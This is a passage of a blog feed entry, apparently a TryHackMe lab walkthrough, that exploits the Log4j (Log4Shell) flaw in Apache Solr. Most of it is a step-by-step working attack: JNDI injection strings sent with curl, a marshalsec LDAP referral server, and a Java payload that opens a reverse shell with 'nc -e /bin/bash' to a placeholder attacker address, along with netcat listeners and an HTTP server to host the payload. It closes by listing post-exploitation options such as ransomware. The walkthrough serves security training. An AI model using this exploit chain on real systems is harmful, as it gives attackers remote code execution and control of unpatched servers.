class=&quot;nf&quot;&gt;jndi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;LDAPRefServer&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;“&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:/&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;YOUR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;ATTACKER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;ADDRESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#Exploit” &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Adjust the IP address for your attacking machine as needed. Note that we supplied the HTTP port listening on 8000.&lt;/p&gt;

&lt;p&gt;You will see an output on your window similar to below:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Listening on 0.0.0.0:1389&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now that our LDAP server is ready and waiting, we can open a second terminal window to prepare our final payload and secondary HTTP server.&lt;/p&gt;

&lt;p&gt;Ultimately, the log4j vulnerability will execute arbitrary code that you craft within the Java programming language.&lt;/p&gt;

&lt;p&gt;Create and move into a new directory where you might host this payload. First, create your payload in a text editor of your choice (mousepad, nano, vim, Sublime Text, VS Code etc), with the specific name Exploit.java:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;kp&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Exploit&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;printStackTrace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; 
&lt;span class=&quot;p&quot;&gt;}}}&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Compile your payload with&lt;/p&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;n&quot;&gt;javac&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;java&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;source&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;and verify it succeeded by running the&lt;/p&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;s1&quot;&gt;'ls'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;command and finding a newly created&lt;/p&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;no&quot;&gt;Exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;class&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;file&lt;/p&gt;

&lt;p&gt;With your payload created and compiled, you can now host it by spinning up a temporary HTTP server.&lt;/p&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;no&quot;&gt;Python3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;server&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8000&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;no&quot;&gt;Phase&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Exploitation&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Your payload is created and compiled, it is hosted with an HTTP server in one terminal, your LDAP referral server is up and waiting in another terminal – next prepare a netcat listener to catch your reverse shell in yet another new terminal window: nc -nlvp 9999&lt;/p&gt;

&lt;p&gt;Finally, all that is left to do is trigger the exploit and fire off our JNDI syntax! Note the changes in port number (now referring to our LDAP server) and the resource we retrieve, specifying our exploit:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt; 
&lt;span class=&quot;s1&quot;&gt;'http://MACHINE_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:138 9/Exploit\}'&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;You have now received initial access and command-and-control on an Apache Solr instance. This is just one example of many, many vulnerable applications affected by this log4j vulnerability.&lt;/p&gt;

&lt;p&gt;At this point, a threat actor can realistically do whatever they would like with the victim – whether it be privilege escalation, exfiltration, install persistence, perform lateral movement or any other postexploitation – potentially dropping cryptocurrency miners, remote access trojans, beacons and implants or even deploying ransomware.&lt;br /&gt;
All it took was a single string of text, and a little bit of set up with freely available tooling.&lt;/p&gt;

&lt;p&gt;This was precisely why the Internet has been on fire during the weekend of December 9th, 2021.&lt;/p&gt;</content><author><name>Thebyteman</name></author><category term="walkthroughs" /><summary type="html">The room for practicing Log4j can be found here: https://tryhackme.com/room/solar Phase 1: Reconnaissance We explore the web interface at http://machine_ip[:]8983; we explore and look around for the log files, to see which path or URL endpoint triggers the logging. We find that “solr/admin/cores/” is where a user can control the data entry point. You may already know the general payload to abuse this log4j vulnerability. The format of the usual syntax that takes advantage of this looks like so: ${jndi: ldap://ATTACKERCONTROLLEDHOST} This syntax indicates that the log4j will invoke functionality from “JNDI”, or the “Java Naming and Directory Interface.” Ultimately, this can be used to access external resources, or “references,” which is what is weaponized in this attack. Notice the ldap:// schema. This indicates that the target will reach out to an endpoint (an attacker controlled location, in the case of this attack) via the LDAP protocol. For now, know that the target will in fact make a connection to an external location. This is indicated by the ATTACKERCONTROLLEDHOST placeholder in the above syntax. You, acting as the attacker in this scenario, can host a simple listener to view this connection. We already discovered that we could supply parameter to the /solr/admin/cores URL to insert our JNDI Syntax. Other locations you might supply this JNDI syntax: • Input boxes, user and password login forms, data entry points within applications • HTTP headers such as User-Agent, X-Forwarded-For, or other customizable headers • Any place for user-supplied data Phase 2: Testing To prepare your environment for testing the vulnerability and receiving a connection We view our own IP address information: a. “ip addr show” OR “ip -br -c a” We prepare a netcat listener on port 9999 a. “nc -nlvp 9999” Now that you have a listener staged, make a request including this primitive JNDI payload syntax as part of the HTTP parameters. This can easily be done with the curl command line utility. “curl ‘http://machine_ip[:]8983/solr/admin/cores?foo$\{jndi:ldap://Your.IP.Address:9999\}’ Note, due to the use of the $ dollar-sign character in your syntax, you must ensure you wrap the URL within single-quotes, so bash (your command-line shell) does not interpret it as a variable. Additionally, you must escape out the { } curly braces with a single backslash character, so those are not misrepresented in the curl command arguments. Verify you have received a connection by seeing the following message in your netcat listener: a. “Connection received from MACHINE_IP” Phase 3: Preparation and Payload Creation At this point, you have verified the target is in fact vulnerable by seeing this connection caught in your netcat listener. However, it made an LDAP request… so all your netcat listener may have seen was non-printable characters (strange looking bytes). We can now build upon this foundation to respond with a real LDAP Handler. We will utilize an open-source and public utility to stage an “LDAP Referral Server”. This will be used to essentially redirect the initial request of the victim to another location, where you can host a secondary payload that will ultimately run code on the target. This breaks down like so: 1. ${jndi:ldap://attackerserver:1389/Resource} -&amp;gt; reaches out to our LDAP Referral Server 2. LDAP Referral Server springboards the request to a secondary http://attackerserver/resource 3. The victim retrieves and executes the code present in http://attackerserver/resource This means we will need an HTTP server, which we could simply host with any of the following options (serving on port 8000): • python3 -m http.server 8000 The first order of business however is obtaining the LDAP Referral Server. We will use the marshalsec utility offered at https://github.com/mbechler/marshalsec Ultimately, this needs to run Java. Reviewing the README for this utility, it suggests using Java 8. (You may or may not have success using a different version, but to “play by the rules,” we will match the same version of Java used on the target virtual machine) You can find a mirror of different Java versions to run on Linux at this location. http://mirrors.rootpei.com/jdk/ and we install Java 8 locally. Now we install Marshalsec utility from github. 1. Clone the repository in any file system location of your choice (I would suggest /tmp or /opt): a. git clone https://github.com/mbechler/marshalsec 2. Download and change directories into this new folder (cd marshalsec) We must build marshalsec with the Java builder maven. If you do not yet have maven on your system, you can install it through your package manager: 'sudo apt install maven' 3. Now, we install the maven packages: 'mvn clean package -DskipTests' 4. With the marshalsec utility built, we can start an LDAP referral server to direct connections to our secondary HTTP server (which we will prepare in just a moment). The syntax to start the LDAP server is as follows: a. java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer “http://YOUR.ATTACKER.IP.ADDRESS:8000/#Exploit” Adjust the IP address for your attacking machine as needed. Note that we supplied the HTTP port listening on 8000. You will see an output on your window similar to below: &quot;Listening on 0.0.0.0:1389&quot; Now that our LDAP server is ready and waiting, we can open a second terminal window to prepare our final payload and secondary HTTP server. Ultimately, the log4j vulnerability will execute arbitrary code that you craft within the Java programming language. Create and move into a new directory where you might host this payload. First, create your payload in a text editor of your choice (mousepad, nano, vim, Sublime Text, VS Code etc), with the specific name Exploit.java: public class Exploit {static {try { java.lang.Runtime.getRuntime().exec(&quot;nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999&quot;); } catch (Exception e) {e.printStackTrace(); }}} Compile your payload with javac Exploit.java -source 8 -target 8 and verify it succeeded by running the 'ls' command and finding a newly created Exploit.class file With your payload created and compiled, you can now host it by spinning up a temporary HTTP server. Python3 -m http.server 8000 Phase 4: Exploitation Your payload is created and compiled, it is hosted with an HTTP server in one terminal, your LDAP referral server is up and waiting in another terminal – next prepare a netcat listener to catch your reverse shell in yet another new terminal window: nc -nlvp 9999 Finally, all that is left to do is trigger the exploit and fire off our JNDI syntax! Note the changes in port number (now referring to our LDAP server) and the resource we retrieve, specifying our exploit: curl 'http://MACHINE_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:138 9/Exploit\}' You have now received initial access and command-and-control on an Apache Solr instance. This is just one example of many, many vulnerable applications affected by this log4j vulnerability. At this point, a threat actor can realistically do whatever they would like with the victim – whether it be privilege escalation, exfiltration, install persistence, perform lateral movement or any other postexploitation – potentially dropping cryptocurrency miners, remote access trojans, beacons and implants or even deploying ransomware. All it took was a single string of text, and a little bit of set up with freely available tooling. This was precisely why the Internet has been on fire during the weekend of December 9th, 2021.</summary></entry></feed>